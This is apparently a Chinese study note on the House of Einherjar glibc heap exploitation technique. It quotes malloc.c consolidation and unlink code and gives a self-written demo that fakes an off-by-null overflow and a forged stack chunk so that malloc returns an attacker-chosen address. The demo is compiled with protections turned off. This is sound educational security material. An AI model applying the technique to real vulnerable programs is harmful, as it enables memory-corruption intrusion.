---
title: House of Einherjar
tags:
    - pwn
    - House of XXX
categories:
    - 学习笔记
cover: /img/齐天大圣.png
---
#  House of Einherjar
## 前言 
​	总算是开始系统的梳理一遍堆溢出中的一个利用手法，也是很久没有写笔记了。这一片也是第一篇不是写题目做的笔记，是为了先看完所有的一个利用方法，再更好得去做题吧。
​	从这篇开始，依次做完23个demo的学习文章

## 相关源码
​	**也是有源码分析了**文件路径(malloc/malloc.c)


### consolidate backward
```c
if (!prev_inuse(p)) {
      prevsize = p->prev_size;
      size += prevsize;
      p = chunk_at_offset(p, -((long) prevsize));
      unlink(av, p, bck, fwd);
    }
```
​		这段代码是向后合并的操作，p是刚刚被释放的堆块。如果它的prev_inuse位是0 的话(正常情况是上一个相邻堆块被释放)，就会执行这段代码。先把前一个堆块的大小(p->prev_size)赋给prevsize，把p的大小修改为两个堆块的大小之和。通过p的地址减去上一个堆块的大小，找到合并后，p应该在的地址，并更新p。再用新的p去执行unlink。

### unlink
```c
#define unlink(AV, P, BK, FD) {                                            \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (P->size)				      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr (check_action,				      \
			       "corrupted double-linked list (not small)",    \
			       P, AV);					      \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```
​	unlink操作在这里没有具体的利用，我们只是最后需要绕过这样的一个检测。让它可以正常进行合并。关于unlink前半部分的代码，会在unlink专属的文章中介绍。这里第9行是针对lagebin的一个检测，而在我们这个利用手法中，基本都是lagebin，所以我们需要对这个fd_nextsize和bk_nextsize,做一个绕过的检测。因为当lagebin中只有一个堆块时，fd_nextsize和bk_nextsize,都指p自己，所以我们把这两个设置为p的地址即可。

### consolidate into top
```c
else {
      size += nextsize;
      set_head(p, size | PREV_INUSE);
      av->top = p;
      check_chunk(av, p);
    }
```

​	这段就是就是把与topchunk 相邻的空闲堆块与top chunk合并。并更新top chunk的大小和地址。

## 原理和条件
### 原理
​	其实原理，我觉得就是指利用的思路，并不是单纯的指源码的操作，这不是我们利用手法的原理。
​	这里是这样，利用某些手段伪造出一个fakechunk，这个chunk位于我们想要分配的目的地址上(记为target)。 同时，我们利用可以正常分配到的一个 chunk (记为p)。通过修改p 的 prevsize和pre_inuse,让p 和target 合并为一个堆块，当然p本身是与topchunk相邻的。此时，target 和 p 都被 topchunk 合并为新的topchunk。此时topchunk 的地址，就迁移到了 target 所在的地址。那么再次分配堆地址，就可以把这个空间分配到手。

### 条件
​	1.伪造fakechunk ，需要泄露 栈地址和堆地址。总之要能泄露地址
​	2.off-by-one 或off-by-null，要能修改pre_inuse。

## demo
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <malloc.h>

int main()
{
	setbuf(stdin,NULL);
	setbuf(stdout,NULL);

	uint8_t* a;
	uint8_t* b;
	uint8_t* c;

	a=(uint8_t*)malloc(0x38);/*假设，我们要利用a去溢出到下一个堆块。*/
	size_t* a_addr=(size_t *)(a-sizeof(size_t)*2);
	size_t  a_size=malloc_usable_size(a);
	printf("\033[1;33m这里，我们申清一个堆块a,假设存在溢出漏洞。需要通过a去溢出：\033[0m\n");
	printf("a的地址(包含chunk头)：%p\n",a_addr);
	printf("a的大小(不含chunk头)：%lx\n\n",a_size);
        
	size_t fakechunk[6];/*这里，我们通过某种方法伪造了fakechunk。*/
	fakechunk[0]=0x100,fakechunk[1]=0x100;
	fakechunk[2]=(size_t)fakechunk;
	fakechunk[3]=(size_t)fakechunk;
	fakechunk[4]=(size_t)fakechunk;
	fakechunk[5]=(size_t)fakechunk;
	printf("\033[1;33m假设，我们通过某种方法，构造了如下的一个fakechunk：\033[0m\n");
	printf("fakechunk的地址(包含chunk头)：%p\n",fakechunk);
	printf("fd: %#lx\n",fakechunk[2]);
	printf("bk: %#lx\n",fakechunk[3]);
	printf("fd_nextsize: %#lx\n",fakechunk[4]);
	printf("bk_nextsize: %#lx\n\n",fakechunk[5]);
	
	b=(uint8_t*)malloc(0xf8);/*这就是要触发，向后合并和topchunk合并的堆块.*/
	size_t* b_size_ptr=(size_t*)(b-sizeof(size_t));/*指向 chunk b 的size位.*/
	size_t* b_addr=(size_t *)(b-sizeof(size_t)*2);/*同时也是 chunk b 的prev_size*/
	printf("\033[1;33m这里创建一个堆块b,作为合并的关键堆块:\033[0m\n");
	printf("b的地址(含chunk头)： %p\n",b_addr);
	printf("b的size位：%#lx\n\b",*b_size_ptr);
	printf("b的prev_size: %#lx\n\n",*b_addr);
	/*
	接下来就是修改size和prev_size
	这里本来是想直接利用b相关的指针去修改b的size 和 prev_size，但是
	这样做体现不出通过a的溢出漏洞来修改，所以还是使用a相关的指针去修改。
	*/
	printf("\033[1;33m那么，对于现在创建的堆块b，我们可以通过溢出去修改它的一些数据:\033[0m\n");
	a[a_size]=0;
	printf("修改后b的size位：%#lx\n",*b_size_ptr);
	
	/*
	接下来是计算，计算fakechunk的大小。fakechunk的大小当然不是0x100,
	它应该是从fakechunk到b中间这么大的一块区域
	*/
	size_t fakesize=(size_t)((uint8_t *)(b_addr)-(uint8_t *)fakechunk);
	printf("b的prev_size应该用 b 的地址减 fakechunk 的地址: %p-%p=%#lx\n",b_addr,fakechunk,fakesize);
	*(size_t *)&a[a_size-sizeof(size_t)]=fakesize;
	printf("修改后b的prev_size: %#lx\n\n",*b_addr);
	/*为了正确的合并，fakechunk的size需要和prev_size对应上*/
	fakechunk[1]=fakesize;
	/*触发合并*/
	free(b);
	printf("合并后fakechunk的size: %#lx\n",fakechunk[1]);
	printf("是b.size+b.prev_szie+b.next_szie(也就是topchunk的大小)得来的\n");
	/*最后看分配到了哪里*/
	c=(uint8_t*)malloc(0x200);
	size_t* c_addr=(size_t *)(c-sizeof(size_t)*2);
	printf("\033[1;33m最后申清一个堆块c,并查看一下是否达到了我们的目的:\033[0m\n");
	printf("c的地址(包含chunk头)：%p\n",c_addr);
}
```
### 说明
​	请在ubuntu16下编译(即使用glibc-2.23)。编译时记得关掉pie，这样便于打断点。
​	编译时参数(只能在64位下编译)
```
gcc -ggdb demo.c -o demo -z execstack -fno-stack-protector -no-pie -z norelro
```
​	这个demo是自己写的，在how2heap的基础上添加了一些基础的描述。希望可以更清楚的表达出，漏洞利的一个思路。同时，关于合并后的size大小，这里描述也做了修改。因为合并是b和fakechunk以及topchunk，所以最后的大小理论上也是三个堆块的大小相加。
![image-20250622133210334](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622133210334.png)
​	事实上，也确实如此

### 逐步演示
#### 创建a堆块
![image-20250622140529903](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140529903.png)
![image-20250622140615994](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140615994.png)

#### 伪造fakechunk
![image-20250622140854930](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622140854930.png)
#### 创建b堆块
![image-20250622](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141009181.png)
#### 篡改b的size的pre_inuse 位
![image-20250622141342243](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141342243.png)
#### 篡改b的prev_size 
![image-20250622141504102](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141504102.png)
#### 修改fakechunk的size
![image-20250622141624553](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622141624553.png)
#### free(b)
![image-20250622143101805](https://cdn.jsdelivr.net/gh/peruy/mypic@main/img/image-20250622143101805.png)